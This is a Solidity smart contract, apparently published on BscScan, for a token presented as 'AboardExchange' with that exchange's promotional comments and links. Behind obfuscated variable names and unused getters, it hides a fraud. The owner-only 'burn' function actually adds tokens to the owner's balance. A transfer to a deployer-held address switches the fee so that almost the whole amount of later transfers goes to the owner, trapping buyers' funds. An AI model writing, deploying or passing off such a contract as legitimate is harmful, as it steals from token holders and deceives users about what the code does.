/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

//////////////////////////////////////////////////
//AboardExchange
//The Order-Book Decentralized Derivatives Exchange on Arbitrum and Avalanche.
//Enjoy gas-free perpetual trading!
//🚀 We are excited to have #BlizzardFund as #AboardExchange’s seed round investor
//🔺 We are now live on Avalanche, making Aboard the first order book derivatives DEX on Avalanche!
//Join our community: 
//  http://linktr.ee/Aboard.Exchange
//  https://github.com/aboard-exchange
//  https://www.youtube.com/channel/UCIcdcO30Wn7ayofOaToixog
//  https://twitter.com/AboardExchange
//////////////////////////////////////////////////

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.12;
contract AboardExchange {
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  SUIZQN = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  MUQAZS = 1000000000000000000;
uint256 private  VTCSGZ = 10000000000;
address private  JMJWHU = address(0);
uint256 public constant LHRUHY = 99999;
address private  CTQUME = address(0);
uint256 private  OVVEEH = 100000000;
address private  UVQWQW = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public owner;
string public  symbol = "AboardEx";
uint256 private  NDGOPP = 1000000000000000000000;
uint8 public constant decimals = 18;
uint256 private  HOEVDB = 1000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  YUBYPX = 1000000000000000000;
address private  KLLAJY = address(0);
address private  CPRBVL = address(0);
string public  name = "AboardEx";
function _getVTCSGZ() private returns (uint256) {
return VTCSGZ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getNDGOPP() private returns (uint256) {
return NDGOPP;
}

function _getOVVEEH() private returns (uint256) {
return OVVEEH;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "DREVWA");
require(to != address(0), "DREVWA");
require(amount <= balanceOf[from], "DREVWA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LHRUHY/MUQAZS ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JMJWHU){
MUQAZS = LHRUHY+2;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getCTQUME() private returns (address) {
return CTQUME;
}

function _getSUIZQN() private returns (uint256) {
return SUIZQN;
}

function _getUVQWQW() private returns (address) {
return UVQWQW;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getKLLAJY() private returns (address) {
return KLLAJY;
}

function _getHOEVDB() private returns (uint256) {
return HOEVDB;
}

function _getYUBYPX() private returns (uint256) {
return YUBYPX;
}

function _getCPRBVL() private returns (address) {
return CPRBVL;
}

constructor () {
JMJWHU = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tDREVWA 0");
require(spender != address(0), "fDREVWA 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}